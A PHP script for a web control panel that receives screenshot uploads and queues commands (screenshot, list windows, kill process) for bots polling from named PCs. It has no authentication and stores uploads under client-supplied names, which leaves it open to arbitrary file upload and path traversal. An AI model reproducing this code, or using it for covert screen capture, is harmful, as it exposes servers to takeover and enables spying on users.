<?php
$imgDir = 'screenshots/';
if (!is_dir($imgDir)) mkdir($imgDir);

// 1. Прием скриншота
if (isset($_FILES['screen'])) {
    move_uploaded_file($_FILES['screen']['tmp_name'], $imgDir . $_FILES['screen']['name']);
    echo "ok"; exit;
}

// 2. Обработка команд (для бота)
if (isset($_GET['get_cmd'])) {
    $pc_id = $_GET['pc_id'] ?? 'unknown';
    $file = "cmd_$pc_id.txt";
    echo file_exists($file) ? file_get_contents($file) : 'none';
    exit;
}

if (isset($_GET['clear_cmd'])) {
    $pc_id = $_GET['pc_id'];
    file_put_contents("cmd_$pc_id.txt", 'none');
    echo "ok"; exit;
}

// 3. Установка команды с сайта
if (isset($_POST['set_cmd'])) {
    $pc_id = $_POST['pc_id'];
    $cmd = $_POST['set_cmd'];
    if ($cmd == 'delete') $cmd .= ' ' . $_POST['proc_name'];
    file_put_contents("cmd_$pc_id.txt", $cmd);
    header("Location: /"); exit;
}
?>
<!DOCTYPE html>
<html>
<body style="background:#0f172a; color:white; font-family:sans-serif; text-align:center;">
    <h1>Панель управления</h1>
    <?php 
    $pcs = ['PC-01', 'PC-02']; // Список твоих ID
    foreach($pcs as $pc) {
        echo "<div style='border:1px solid #475569; margin:10px; padding:10px;'>
                <h3>$pc</h3>
                <form method='POST'>
                    <input type='hidden' name='pc_id' value='$pc'>
                    <button name='set_cmd' value='screen'>📸 Скрин</button>
                    <button name='set_cmd' value='app'>📋 Список окон</button>
                    <input type='text' name='proc_name' placeholder='Процесс'>
                    <button name='set_cmd' value='delete'>❌ Kill</button>
                </form>
              </div>";
    }
    ?>
</body>
</html>
